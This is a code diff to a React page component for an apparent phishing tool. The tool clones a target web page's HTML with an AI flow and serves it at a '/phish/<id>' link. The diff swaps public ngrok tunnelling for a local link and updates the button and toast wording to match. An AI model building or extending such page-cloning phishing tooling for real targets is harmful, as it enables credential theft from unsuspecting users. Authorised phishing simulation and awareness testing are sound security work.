@@ -19,7 +19,6 @@ import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '
 import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
 import { Textarea } from '@/components/ui/textarea';
 import { clonePageFromUrl } from '@/ai/flows/clone-page-from-url-flow';
-import { startNgrokTunnel } from '@/services/ngrok-service';
 
 const clonerSchema = z.object({
   redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
@@ -223,22 +222,15 @@ export default function PhishingPage() {
   const handleGenerateLink = async () => {
     if (!modifiedHtml) return;
     setIsHosting(true);
-    setHostedUrl(null);
     
     try {
-      toast({ title: "Generating Public Link...", description: "Starting ngrok tunnel. This may take a moment." });
-
-      // Start the tunnel and wait for the URL
-      const { url } = await startNgrokTunnel();
-
-      if (url) {
         const pageId = crypto.randomUUID();
         const pageStorageKey = `phishing-html-${pageId}`;
         localStorage.setItem(pageStorageKey, modifiedHtml);
 
-        const finalUrl = `${url}/phish/${pageId}`;
+        const finalUrl = `${window.location.origin}/phish/${pageId}`;
         setHostedUrl(finalUrl);
-        toast({ title: "Public Link Generated!", description: "Your phishing page is now accessible via ngrok." });
+        toast({ title: "Local Link Generated!", description: "Your phishing page is ready to be used." });
 
         const urlToClone = form.getValues('urlToClone');
         logActivity({
@@ -246,9 +238,6 @@ export default function PhishingPage() {
             action: 'Generated Phishing Link',
             details: `Source: ${urlToClone || 'Pasted HTML'}`,
         });
-      } else {
-         throw new Error("Ngrok did not return a URL.");
-      }
     } catch(err) {
         const error = err instanceof Error ? err.message : "An unknown error occurred";
         toast({ variant: 'destructive', title: 'Hosting Failed', description: error });
@@ -345,11 +334,11 @@ export default function PhishingPage() {
                     </CardContent>
                     {modifiedHtml && (
                     <CardFooter className="flex-col items-start gap-4">
-                        <CardTitle className="text-xl">Generate Public Link</CardTitle>
+                        <CardTitle className="text-xl">Generate Link</CardTitle>
                         <div className="w-full flex gap-2">
                         <Button type="button" onClick={handleGenerateLink} disabled={isProcessing || isHosting} className="w-full">
                            {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Share2 className="mr-2 h-4 w-4" />}
-                           Generate Public Link (ngrok)
+                           Generate Local Link
                         </Button>
                         <Button type="button" variant="secondary" onClick={handleCopyHtml}>
                             <Clipboard className="mr-2 h-4 w-4" />
